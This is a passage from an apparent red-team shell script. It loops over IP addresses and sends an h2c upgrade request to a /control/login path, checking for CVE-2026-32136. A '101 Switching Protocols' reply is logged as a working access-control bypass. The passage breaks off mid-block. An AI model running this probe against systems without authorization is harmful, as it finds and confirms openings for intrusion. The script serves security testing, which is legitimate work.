    for ip in $ips; do
        # CVE-2026-32136: Send h2c upgrade request to /control/login
        local resp=$(curl -sD - --max-time 12 -k -H "Host: ${target}" \
            -H "Upgrade: h2c" \
            -H "HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA" \
            -H "Connection: Upgrade, HTTP2-Settings" \
            "https://${ip}/control/login" 2>/dev/null)
        echo "$resp" | grep -q '101 Switching Protocols' && {
            echo "CVE-2026-32136: h2c UPGRADE ACCEPTED at ${ip}!" >> "$SESSION/rt/cve_2026_32136.txt"
            rt "CRITICAL: CVE-2026-32136 h2c bypass WORKING at ${ip}!"
